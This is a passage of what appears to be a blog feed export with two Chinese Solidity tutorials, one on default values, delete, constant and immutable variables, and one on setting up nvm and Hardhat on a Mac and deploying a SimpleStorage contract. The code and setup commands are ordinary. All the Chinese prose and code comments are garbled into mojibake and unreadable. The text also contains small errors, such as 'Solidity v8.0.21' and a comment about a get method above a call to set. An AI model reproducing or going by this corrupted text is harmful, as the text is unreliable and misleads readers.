class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.21;</span><br><span class="line"></span><br><span class="line">contract InitialValue &#123;</span><br><span class="line">    // Value Types</span><br><span class="line">    bool public _bool; // false</span><br><span class="line">    string public _string; // &quot;&quot;</span><br><span class="line">    int public _int; // 0</span><br><span class="line">    uint public _uint; // 0</span><br><span class="line">    address public _address; // 0x0000000000000000000000000000000000000000</span><br><span class="line"></span><br><span class="line">    enum ActionSet &#123; Buy, Hold, Sell&#125;</span><br><span class="line">    ActionSet public _enum; // ç¬¬ä¸€ä¸ªå…ƒç´  0</span><br><span class="line"></span><br><span class="line">    function fi() internal&#123;&#125; // internalç©ºç™½æ–¹ç¨‹ </span><br><span class="line">    function fe() external&#123;&#125; // externalç©ºç™½æ–¹ç¨‹ </span><br><span class="line"></span><br><span class="line">    // Reference Types</span><br><span class="line">    uint[8] public _staticArray; // æ‰€æœ‰æˆå‘˜è®¾ä¸ºå…¶é»˜è®¤å€¼çš„é™æ€æ•°ç»„[0,0,0,0,0,0,0,0]</span><br><span class="line">    uint[] public _dynamicArray; // `[]`</span><br><span class="line">    mapping(uint =&gt; address) public _mapping; // æ‰€æœ‰å…ƒç´ éƒ½ä¸ºå…¶é»˜è®¤å€¼çš„mapping</span><br><span class="line">    // æ‰€æœ‰æˆå‘˜è®¾ä¸ºå…¶é»˜è®¤å€¼çš„ç»“æ„ä½“ 0, 0</span><br><span class="line">    struct Student&#123;</span><br><span class="line">        uint256 id;</span><br><span class="line">        uint256 score; </span><br><span class="line">    &#125;</span><br><span class="line">    Student public student;</span><br><span class="line"></span><br><span class="line">    // deleteæ“ä½œç¬¦</span><br><span class="line">    bool public _bool2 = true; </span><br><span class="line">    function d() external &#123;</span><br><span class="line">        delete _bool2; // delete ä¼šè®©_bool2å˜ä¸ºé»˜è®¤å€¼ï¼Œfalse</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å€¼ç±»å‹åˆå§‹å€¼">å€¼ç±»å‹åˆå§‹å€¼</h3><ul><li><p><code>boolean</code>: <code>false</code></p></li><li><p><code>string</code>: <code>&quot;&quot;</code></p></li><li><p><code>int</code>: <code>0</code></p></li><li><p><code>uint</code>: <code>0</code></p></li><li><p><code>enum</code>: æšä¸¾ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ </p></li><li><p><code>address</code>: <code>0x0000000000000000000000000000000000000000</code> (æˆ– <code>address(0)</code>)</p></li><li><p><code>function</code></p><ul><li><p><code>internal</code>: ç©ºç™½å‡½æ•°</p></li><li><p><code>external</code>: ç©ºç™½å‡½æ•°</p></li></ul></li></ul><p>å¯ä»¥ç”¨<code>public</code>å˜é‡çš„<code>getter</code>å‡½æ•°éªŒè¯ä¸Šé¢å†™çš„åˆå§‹å€¼æ˜¯å¦æ­£ç¡®ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">bool public _bool; // false</span><br><span class="line">string public _string; // &quot;&quot;</span><br><span class="line">int public _int; // 0</span><br><span class="line">uint public _uint; // 0</span><br><span class="line">address public _address; // 0x0000000000000000000000000000000000000000</span><br><span class="line"></span><br><span class="line">enum ActionSet &#123; Buy, Hold, Sell&#125;</span><br><span class="line">ActionSet public _enum; // ç¬¬1ä¸ªå†…å®¹Buyçš„ç´¢å¼•0</span><br><span class="line"></span><br><span class="line">function fi() internal&#123;&#125; // internalç©ºç™½å‡½æ•°</span><br><span class="line">function fe() external&#123;&#125; // externalç©ºç™½å‡½æ•° </span><br></pre></td></tr></table></figure><h3 id="å¼•ç”¨ç±»å‹åˆå§‹å€¼">å¼•ç”¨ç±»å‹åˆå§‹å€¼</h3><ul><li>æ˜ å°„<code>mapping</code>: æ‰€æœ‰å…ƒç´ éƒ½ä¸ºå…¶é»˜è®¤å€¼çš„<code>mapping</code></li><li>ç»“æ„ä½“<code>struct</code>: æ‰€æœ‰æˆå‘˜è®¾ä¸ºå…¶é»˜è®¤å€¼çš„ç»“æ„ä½“</li><li>æ•°ç»„<code>array</code><ul><li>åŠ¨æ€æ•°ç»„: <code>[]</code></li><li>é™æ€æ•°ç»„ï¼ˆå®šé•¿ï¼‰: æ‰€æœ‰æˆå‘˜è®¾ä¸ºå…¶é»˜è®¤å€¼çš„é™æ€æ•°ç»„</li></ul></li></ul><p>å¯ä»¥ç”¨<code>public</code>å˜é‡çš„<code>getter</code>å‡½æ•°éªŒè¯ä¸Šé¢å†™çš„åˆå§‹å€¼æ˜¯å¦æ­£ç¡®ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// Reference Types</span><br><span class="line">uint[8] public _staticArray; // æ‰€æœ‰æˆå‘˜è®¾ä¸ºå…¶é»˜è®¤å€¼çš„é™æ€æ•°ç»„[0,0,0,0,0,0,0,0]</span><br><span class="line">uint[] public _dynamicArray; // `[]`</span><br><span class="line">mapping(uint =&gt; address) public _mapping; // æ‰€æœ‰å…ƒç´ éƒ½ä¸ºå…¶é»˜è®¤å€¼çš„mapping</span><br><span class="line">// æ‰€æœ‰æˆå‘˜è®¾ä¸ºå…¶é»˜è®¤å€¼çš„ç»“æ„ä½“ 0, 0</span><br><span class="line">struct Student&#123;</span><br><span class="line">    uint256 id;</span><br><span class="line">    uint256 score; </span><br><span class="line">&#125;</span><br><span class="line">Student public student;</span><br></pre></td></tr></table></figure><h3 id="deleteæ“ä½œç¬¦"><code>delete</code>æ“ä½œç¬¦</h3><p><code>delete a</code>ä¼šè®©å˜é‡<code>a</code>çš„å€¼å˜ä¸ºåˆå§‹å€¼ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// deleteæ“ä½œç¬¦</span><br><span class="line">bool public _bool2 = true; </span><br><span class="line">function d() external &#123;</span><br><span class="line">    delete _bool2; // delete ä¼šè®©_bool2å˜ä¸ºé»˜è®¤å€¼ï¼Œfalse</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>å€¼ç±»å‹ã€å¼•ç”¨ç±»å‹<code>delete</code>æ“ä½œåçš„é»˜è®¤å€¼ã€‚</strong></p><h2 id="å¸¸æ•°">å¸¸æ•°</h2><p>è¿™ä¸€è®²ï¼Œæˆ‘ä»¬ä»‹ç»Solidityä¸­å’Œå¸¸é‡ç›¸å…³çš„ä¸¤ä¸ªå…³é”®å­—ï¼Œ<code>constant</code>ï¼ˆå¸¸é‡ï¼‰å’Œ<code>immutable</code>ï¼ˆä¸å˜é‡ï¼‰ã€‚çŠ¶æ€å˜é‡å£°æ˜è¿™ä¸¤ä¸ªå…³é”®å­—ä¹‹åï¼Œä¸èƒ½åœ¨åˆå§‹åŒ–åæ›´æ”¹æ•°å€¼ã€‚è¿™æ ·åšçš„å¥½å¤„æ˜¯æå‡åˆçº¦çš„å®‰å…¨æ€§å¹¶èŠ‚çœ<code>gas</code>ã€‚</p><p>å¦å¤–ï¼Œåªæœ‰æ•°å€¼å˜é‡å¯ä»¥å£°æ˜<code>constant</code>å’Œ<code>immutable</code>ï¼›<code>string</code>å’Œ<code>bytes</code>å¯ä»¥å£°æ˜ä¸º<code>constant</code>ï¼Œä½†ä¸èƒ½ä¸º<code>immutable</code>ã€‚</p><p>æµ‹è¯•ä»£ç <code>Constant.sol</code>ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.21;</span><br><span class="line">contract Constant &#123;</span><br><span class="line">    // constantå˜é‡å¿…é¡»åœ¨å£°æ˜çš„æ—¶å€™åˆå§‹åŒ–ï¼Œä¹‹åä¸èƒ½æ”¹å˜</span><br><span class="line">    uint256 public constant CONSTANT_NUM = 10;</span><br><span class="line">    string public constant CONSTANT_STRING = &quot;0xAA&quot;;</span><br><span class="line">    bytes public constant CONSTANT_BYTES = &quot;WTF&quot;;</span><br><span class="line">    address public constant CONSTANT_ADDRESS = 0x0000000000000000000000000000000000000000;</span><br><span class="line"></span><br><span class="line">    // immutableå˜é‡å¯ä»¥åœ¨constructoré‡Œåˆå§‹åŒ–ï¼Œä¹‹åä¸èƒ½æ”¹å˜</span><br><span class="line">    uint256 public immutable IMMUTABLE_NUM = 9999999999;</span><br><span class="line">    address public immutable IMMUTABLE_ADDRESS;</span><br><span class="line">    uint256 public immutable IMMUTABLE_BLOCK;</span><br><span class="line">    uint256 public immutable IMMUTABLE_TEST;</span><br><span class="line"></span><br><span class="line">    // åˆ©ç”¨constructoråˆå§‹åŒ–immutableå˜é‡ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨</span><br><span class="line">    constructor()&#123;</span><br><span class="line">        IMMUTABLE_ADDRESS = address(this);</span><br><span class="line">        IMMUTABLE_NUM = 1118;</span><br><span class="line">        IMMUTABLE_TEST = test();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function test() public pure returns(uint256)&#123;</span><br><span class="line">        uint256 what = 9;</span><br><span class="line">        return(what);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="constantå’Œimmutable">constantå’Œimmutable</h3><h4 id="constant">constant</h4><p><code>constant</code>å˜é‡å¿…é¡»åœ¨å£°æ˜çš„æ—¶å€™åˆå§‹åŒ–ï¼Œä¹‹åå†ä¹Ÿä¸èƒ½æ”¹å˜ã€‚å°è¯•æ”¹å˜çš„è¯ï¼Œç¼–è¯‘ä¸é€šè¿‡ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// constantå˜é‡å¿…é¡»åœ¨å£°æ˜çš„æ—¶å€™åˆå§‹åŒ–ï¼Œä¹‹åä¸èƒ½æ”¹å˜</span><br><span class="line">uint256 constant CONSTANT_NUM = 10;</span><br><span class="line">string constant CONSTANT_STRING = &quot;0xAA&quot;;</span><br><span class="line">bytes constant CONSTANT_BYTES = &quot;WTF&quot;;</span><br><span class="line">address constant CONSTANT_ADDRESS = 0x0000000000000000000000000000000000000000;</span><br></pre></td></tr></table></figure><h4 id="immutable">immutable</h4><p><code>immutable</code>å˜é‡å¯ä»¥åœ¨å£°æ˜æ—¶æˆ–æ„é€ å‡½æ•°ä¸­åˆå§‹åŒ–ï¼Œå› æ­¤æ›´åŠ çµæ´»ã€‚åœ¨<code>Solidity v8.0.21</code>ä»¥åï¼Œ<code>immutable</code>å˜é‡ä¸éœ€è¦æ˜¾å¼åˆå§‹åŒ–ã€‚åä¹‹ï¼Œåˆ™éœ€è¦æ˜¾å¼åˆå§‹åŒ–ã€‚ è‹¥<code>immutable</code>å˜é‡æ—¢åœ¨å£°æ˜æ—¶åˆå§‹åŒ–ï¼Œåˆåœ¨constructorä¸­åˆå§‹åŒ–ï¼Œä¼šä½¿ç”¨constructoråˆå§‹åŒ–çš„å€¼ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// immutableå˜é‡å¯ä»¥åœ¨constructoré‡Œåˆå§‹åŒ–ï¼Œä¹‹åä¸èƒ½æ”¹å˜</span><br><span class="line">uint256 public immutable IMMUTABLE_NUM = 9999999999;</span><br><span class="line">address public immutable IMMUTABLE_ADDRESS;</span><br><span class="line">uint256 public immutable IMMUTABLE_BLOCK;</span><br><span class="line">uint256 public immutable IMMUTABLE_TEST;</span><br></pre></td></tr></table></figure><p>ä½ å¯ä»¥ä½¿ç”¨å…¨å±€å˜é‡ä¾‹å¦‚<code>address(this)</code>ï¼Œ<code>block.number</code> æˆ–è€…è‡ªå®šä¹‰çš„å‡½æ•°ç»™<code>immutable</code>å˜é‡åˆå§‹åŒ–ã€‚åœ¨ä¸‹é¢è¿™ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬åˆ©ç”¨äº†<code>test()</code>å‡½æ•°ç»™<code>IMMUTABLE_TEST</code>åˆå§‹åŒ–ä¸º<code>9</code>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// åˆ©ç”¨constructoråˆå§‹åŒ–immutableå˜é‡ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨</span><br><span class="line">constructor()&#123;</span><br><span class="line">    IMMUTABLE_ADDRESS = address(this);</span><br><span class="line">    IMMUTABLE_NUM = 1118;</span><br><span class="line">    IMMUTABLE_TEST = test();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function test() public pure returns(uint256)&#123;</span><br><span class="line">    uint256 what = 9;</span><br><span class="line">    return(what);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-20250125011902342.png" alt="image-20250125011902342"></p><h2 id="å‚è€ƒ">å‚è€ƒ</h2><p><a href="https://www.wtf.academy/docs/solidity-101/HelloWeb3">https://www.wtf.academy/docs/solidity-101/HelloWeb3</a></p><p><a href="https://github.com/AmazingAng/WTF-Solidity">https://github.com/AmazingAng/WTF-Solidity</a></p>]]></content>
      
      
      <categories>
          
          <category> Web3 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä»¥å¤ªåŠ </tag>
            
            <tag> solidity </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>macæ­å»ºhardhatä»¥å¤ªåŠå¼€å‘ç¯å¢ƒ</title>
      <link href="/2025/01/13/mac%E6%90%AD%E5%BB%BAhardhat%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/"/>
      <url>/2025/01/13/mac%E6%90%AD%E5%BB%BAhardhat%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<h2 id="Nodeç¯å¢ƒé…ç½®">Nodeç¯å¢ƒé…ç½®</h2><p>é¦–å…ˆå®‰è£…<code>nvm</code>ï¼Œå†å®‰è£…<code>node18</code>ï¼Œä¸ºäº†å’Œ<code>hardhat</code>çš„è¿è¡Œç¯å¢ƒåŒ¹é…</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install nvm</span><br></pre></td></tr></table></figure><p>é…ç½®nvmç¯å¢ƒï¼Œåœ¨<code>ï½/.zshrc</code>ä¸­åŠ å…¥ä¸‹é¢çš„å†…å®¹ã€‚</p><p>ç¼–è¾‘<code>ï½/.zshrc</code>ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.zshrc</span><br></pre></td></tr></table></figure><p>åŠ å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export NVM_DIR=&quot;$HOME/.nvm&quot;</span><br><span class="line">[ -s &quot;/opt/homebrew/opt/nvm/nvm.sh&quot; ] &amp;&amp; \. &quot;/opt/homebrew/opt/nvm/nvm.sh&quot;  # This loads nvm</span><br><span class="line">[ -s &quot;/opt/homebrew/opt/nvm/etc/bash_completion.d/nvm&quot; ] &amp;&amp; \. &quot;/opt/homebrew/opt/nvm/etc/bash_completion.d/nvm&quot;  # This loads nvm bash_completion</span><br></pre></td></tr></table></figure><p>ä¿å­˜ï¼Œå¹¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source ~/.zshrc</span><br></pre></td></tr></table></figure><p>é…ç½®å¥½åï¼Œå¦‚ä¸‹ï¼š</p><p><img src="/2025/01/13/mac%E6%90%AD%E5%BB%BAhardhat%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/image-20250113214138233.png" alt="image-20250113214138233"></p><p>æ¥ä¸‹æ¥ï¼Œå®‰è£…<code>node18</code>ï¼Œä½¿ç”¨ä¸‹é¢å‘½ä»¤ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nvm install 18</span><br></pre></td></tr></table></figure><p>å¦‚ä¸‹ï¼Œå®‰è£…æˆåŠŸã€‚</p><p><img src="/2025/01/13/mac%E6%90%AD%E5%BB%BAhardhat%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/image-20250113214511440.png" alt="image-20250113214511440"></p><h2 id="æ­å»ºhardhatç¯å¢ƒ">æ­å»ºhardhatç¯å¢ƒ</h2><p>åˆ›å»ºä¸€ä¸ªç›®å½•ï¼Œä¸“é—¨ç”¨äºä»¥å¤ªåŠå­¦ä¹ ï¼Œéšæ„ï¼Œå¦‚<code>/Web3</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /Web3</span><br><span class="line">mkdir hardhat-simple-contract</span><br><span class="line">cd hardhat-simple-contract</span><br><span class="line">npm init -y</span><br><span class="line">npm install --save-dev hardhat</span><br></pre></td></tr></table></figure><p>ç„¶ååˆå§‹åŒ–<code>hardhat</code>é¡¹ç›®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx hardhat</span><br></pre></td></tr></table></figure><p>é€‰æ‹©ç¬¬ä¸€ä¸ªåˆ›å»ºä¸€ä¸ª<code>JavaScript project</code>ï¼Œé¡¹ç›®è·¯å¾„é€‰æ‹©åˆšå¼€å§‹åˆ›å»ºæ–‡ä»¶å¤¹çš„è·¯å¾„ã€‚</p><p>æ³¨æ„âš ï¸æˆ‘è¿™é‡Œæ˜¯æ¢äº†ä¸€ä¸ªè·¯å¾„æ¼”ç¤ºä¸€ä¸‹ã€‚</p><p><img src="/2025/01/13/mac%E6%90%AD%E5%BB%BAhardhat%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/image-20250113232445250.png" alt="image-20250113232445250"></p><p>åˆå§‹åŒ–åçš„æ–‡ä»¶ç›®å½•å¦‚ä¸‹ï¼š</p><p><img src="/2025/01/13/mac%E6%90%AD%E5%BB%BAhardhat%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/image-20250113234740753.png" alt="image-20250113234740753"></p><p>å…¶ä¸­çš„<code>scripts</code>æ–‡ä»¶å¤¹éœ€è¦è‡ªå·±åˆ›å»ºã€‚</p><h2 id="éƒ¨ç½²æ™ºèƒ½åˆçº¦">éƒ¨ç½²æ™ºèƒ½åˆçº¦</h2><p>è¿›å…¥åˆ°æ–‡ä»¶å¤¹<code>contracts</code>ä¸‹ï¼Œåˆ›å»ºåˆçº¦æ–‡ä»¶<code>SimpleStorage.sol</code>ï¼Œç®€å•çš„éƒ¨ç½²ä¸€ä¸ªåˆçº¦ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract SimpleStorage &#123;</span><br><span class="line">    uint256 private storedValue;</span><br><span class="line"></span><br><span class="line">    event ValueChanged(uint256 newValue);</span><br><span class="line"></span><br><span class="line">    function set(uint256 value) public &#123;</span><br><span class="line">        storedValue = value;</span><br><span class="line">        emit ValueChanged(value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get() public view returns (uint256) &#123;</span><br><span class="line">        return storedValue;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åè¿›å…¥åˆ°åˆ›å»ºçš„<code>scripts</code>æ–‡ä»¶å¤¹ä¸‹ï¼Œåˆ›å»ºéƒ¨ç½²åˆçº¦çš„è„šæœ¬<code>deploy.js</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> hre = <span class="built_in">require</span>(<span class="string">&quot;hardhat&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// è·å–åˆçº¦å·¥å‚</span></span><br><span class="line">    <span class="keyword">const</span> <span class="title class_">SimpleStorage</span> = <span class="keyword">await</span> hre.<span class="property">ethers</span>.<span class="title function_">getContractFactory</span>(<span class="string">&quot;SimpleStorage&quot;</span>);</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// éƒ¨ç½²åˆçº¦</span></span><br><span class="line">    <span class="keyword">const</span> simpleStorage = <span class="keyword">await</span> <span class="title class_">SimpleStorage</span>.<span class="title function_">deploy</span>();</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// ç­‰å¾…éƒ¨ç½²å®Œæˆ</span></span><br><span class="line">    <span class="keyword">await</span> simpleStorage.<span class="title function_">waitForDeployment</span>();</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// è·å–åˆçº¦åœ°å€</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`SimpleStorage deployed to: <span class="subst">$&#123;simpleStorage.target&#125;</span>`</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">main</span>()</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function">() =&gt;</span> process.<span class="title function_">exit</span>(<span class="number">0</span>))</span><br><span class="line">    .<span class="title function_">catch</span>(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">error</span>(error);</span><br><span class="line">      process.<span class="title function_">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><p>é¦–å…ˆéœ€è¦å¯¹ç¼–å†™çš„æ™ºèƒ½åˆçº¦è¿›è¡Œç¼–è¯‘</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx hardhat compile</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘æˆåŠŸåï¼Œä¼šè¾“å‡º<code>Compiled 2 Solidity files successfully (evm target: paris)</code></p><p>ç„¶åå¯åŠ¨æœ¬åœ°çš„ä»¥å¤ªåŠç½‘ç»œï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx hardhat node</span><br></pre></td></tr></table></figure><p><img src="/2025/01/13/mac%E6%90%AD%E5%BB%BAhardhat%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/image-20250113221945116.png" alt="image-20250113221945116"></p><p>ä»¥å¤ªåŠç½‘ç»œå¯åŠ¨æˆåŠŸã€‚</p><p>è¿›è¡Œåˆçº¦çš„éƒ¨ç½²ï¼Œæ‰§è¡Œéƒ¨ç½²çš„jsæ–‡ä»¶å¦‚ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx hardhat run scripts/deploy.js --network localhost</span><br></pre></td></tr></table></figure><p><img src="/2025/01/13/mac%E6%90%AD%E5%BB%BAhardhat%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/image-20250113222224915.png" alt="image-20250113222224915"></p><p>åˆçº¦æˆåŠŸéƒ¨ç½²ï¼Œå¾—åˆ°éƒ¨ç½²åˆçº¦çš„åœ°å€<code>0x5fbdb2315678afecb367f032d93f642f64180aa3</code>ã€‚</p><h2 id="è°ƒç”¨åˆçº¦å‡½æ•°">è°ƒç”¨åˆçº¦å‡½æ•°</h2><p>åˆ›å»ºä¸€ä¸ªè°ƒç”¨åˆçº¦çš„ä»£ç <code>test.js</code>ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// scripts/test.js</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="title class_">SimpleStorage</span> = <span class="keyword">await</span> ethers.<span class="title function_">getContractAt</span>(<span class="string">&quot;SimpleStorage&quot;</span>, <span class="string">&quot;0x5fbdb2315678afecb367f032d93f642f64180aa3&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åœ¨è¿™é‡Œç»§ç»­ç¼–å†™è„šæœ¬é€»è¾‘ï¼Œä¾‹å¦‚è¯»å–æˆ–è°ƒç”¨åˆçº¦æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">const</span> value = <span class="keyword">await</span> <span class="title class_">SimpleStorage</span>.<span class="title function_">set</span>(<span class="number">42</span>); <span class="comment">// å‡è®¾ä½ çš„åˆçº¦æœ‰ä¸€ä¸ª `get` æ–¹æ³•</span></span><br><span class="line">    <span class="comment">//const value = await SimpleStorage.get()</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Stored value:&quot;</span>, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ•è·é”™è¯¯</span></span><br><span class="line"><span class="title function_">main</span>().<span class="title function_">catch</span>(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(error);</span><br><span class="line">    process.<span class="property">exitCode</span> = <span class="number">1</span>;</span><br><span class="line">&#125;);</span><br><span 